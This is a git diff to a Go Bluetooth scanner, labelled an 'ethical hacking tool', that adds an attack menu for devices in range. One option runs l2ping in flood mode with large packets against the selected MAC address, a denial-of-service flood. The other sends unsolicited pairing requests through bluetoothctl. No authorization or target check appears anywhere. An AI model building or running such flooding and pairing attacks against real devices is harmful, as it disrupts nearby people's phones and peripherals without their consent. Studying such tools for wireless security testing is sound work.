@@ -4,6 +4,7 @@ import (
 	"bufio"
 	"fmt"
 	"os"
+	"os/exec"
 	"os/signal"
 	"strings"
 	"syscall"
@@ -15,10 +16,11 @@ import (
 
 var (
 	adapter              = bluetooth.DefaultAdapter
-	dispositivosVistos   = make(map[string]bool) // Para evitar repetidos
-	listaDispositivos    = []string{}            // Para mostrar en menú
+	dispositivosVistos   = make(map[string]bool)
+	listaDispositivos    = []string{}
 	addressToDeviceInfo  = make(map[string]DeviceInfo)
-	imprimirDispositivos = true // Controlar impresión en pantalla
+	addressList          = []string{}
+	imprimirDispositivos = true
 )
 
 type DeviceInfo struct {
@@ -35,7 +37,6 @@ func main() {
 	fmt.Println("[*] Escaneando dispositivos Bluetooth...")
 	fmt.Println("[m] Mostrar menú de dispositivos | [q] Salir")
 
-	// Manejar interrupciones Ctrl+C
 	c := make(chan os.Signal, 1)
 	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
 	go func() {
@@ -45,10 +46,8 @@ func main() {
 		os.Exit(0)
 	}()
 
-	// Escuchar entradas de teclado
 	go listenForKeys()
 
-	// Empezar escaneo
 	err := adapter.Scan(func(adapter *bluetooth.Adapter, device bluetooth.ScanResult) {
 		address := device.Address.String()
 		name := device.LocalName()
@@ -59,6 +58,7 @@ func main() {
 
 			info := fmt.Sprintf("%s - %s (RSSI: %d)", address, name, device.RSSI)
 			listaDispositivos = append(listaDispositivos, info)
+			addressList = append(addressList, address)
 
 			addressToDeviceInfo[address] = DeviceInfo{
 				Name: name,
@@ -75,7 +75,6 @@ func main() {
 	})
 	must("escanear", err)
 
-	// Mantener programa vivo
 	for {
 		time.Sleep(1 * time.Second)
 	}
@@ -101,8 +100,8 @@ func listenForKeys() {
 }
 
 func showDeviceMenu() {
-	imprimirDispositivos = false                   // Pausar impresión
-	defer func() { imprimirDispositivos = true }() // Reanudar impresión al salir
+	imprimirDispositivos = false
+	defer func() { imprimirDispositivos = true }()
 
 	if len(listaDispositivos) == 0 {
 		fmt.Println("[!] No se han detectado dispositivos todavía.")
@@ -121,11 +120,57 @@ func showDeviceMenu() {
 		return
 	}
 
-	selected := listaDispositivos[index]
-	fmt.Println("\n[*] Dispositivo seleccionado:")
-	fmt.Println(selected)
+	selectedAddress := addressList[index]
+	selectedDevice := addressToDeviceInfo[selectedAddress]
 
-	fmt.Println("[!] (Próximamente: funcionalidades de ataque ético...)")
+	fmt.Println("\n[*] Dispositivo seleccionado:")
+	fmt.Printf("%s - %s (RSSI: %d)\n", selectedAddress, selectedDevice.Name, selectedDevice.RSSI)
+
+	showAttackMenu(selectedAddress)
+}
+
+func showAttackMenu(mac string) {
+	prompt := promptui.Select{
+		Label: "Acción",
+		Items: []string{"Enviar L2CAP Flood", "Enviar Fake Pairing Request", "Cancelar"},
+	}
+
+	index, _, err := prompt.Run()
+	if err != nil {
+		fmt.Printf("[-] Error al seleccionar acción: %v\n", err)
+		return
+	}
+
+	switch index {
+	case 0:
+		launchL2CAPFlood(mac)
+	case 1:
+		launchFakePairing(mac)
+	case 2:
+		fmt.Println("[*] Acción cancelada.")
+	}
+}
+
+func launchL2CAPFlood(mac string) {
+	fmt.Println("[*] Iniciando ataque L2CAP Flood...")
+	cmd := exec.Command("l2ping", "-i", "hci0", "-s", "600", "-f", mac)
+	cmd.Stdout = os.Stdout
+	cmd.Stderr = os.Stderr
+	err := cmd.Run()
+	if err != nil {
+		fmt.Printf("[-] Error ejecutando l2ping: %v\n", err)
+	}
+}
+
+func launchFakePairing(mac string) {
+	fmt.Println("[*] Iniciando ataque de Fake Pairing Request...")
+	cmd := exec.Command("bluetoothctl", "pair", mac)
+	cmd.Stdout = os.Stdout
+	cmd.Stderr = os.Stderr
+	err := cmd.Run()
+	if err != nil {
+		fmt.Printf("[-] Error ejecutando bluetoothctl pair: %v\n", err)
+	}
 }
 
 func saveDevice(timestamp, address, name string, rssi int16) {
@@ -164,6 +209,7 @@ func printBanner() {
   \(    )/      \(    )/       \(   )/    \( |_____|/    \(       )/      \(   )/    \(       )/    \( |_____|/ 
    '    '        '    '         '   '      '    )/        '       '        '   '      '       '      '    )/    
                                                 '                                                         '     
+				  Bluetooth Ethical Hacking Tool
                   Developed by Ivan Fernandez Rodriguez
 `
 	fmt.Println(banner)
